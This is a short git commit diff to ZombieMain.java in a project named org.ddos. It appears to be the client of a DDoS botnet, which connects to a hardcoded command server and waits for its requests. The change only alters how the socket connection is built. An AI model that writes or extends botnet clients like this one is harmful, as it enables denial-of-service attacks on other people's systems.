719fbcc7213ce97093182e34bc67e703e63aedf2
Delmox <thedogepwner@gmail.com>
2016-04-24 16:31:50 -0700

    Fixed SSL support

--- src/org/ddos/zombie/ZombieMain.java
+++ src/org/ddos/zombie/ZombieMain.java
@@ -6,11 +6,12 @@ import java.io.IOException;
 import org.ddos.network.ZombieNetwork;
 import org.ddos.util.ServerConstants;
 import org.jnetwork.Connection;
+import org.jnetwork.SocketType;
 
 public class ZombieMain {
 	public static void main(String[] args) {
 		try {
-			ZombieNetwork.setClient(new Connection(ServerConstants.ADDRESS, ServerConstants.PORT));
+			ZombieNetwork.setClient(new Connection(SocketType.DEFAULT, ServerConstants.ADDRESS, ServerConstants.PORT));
 			RequestHandler.handleRequest();
 		} catch (EOFException e) {
 			System.out.println("Disconnected from server.");
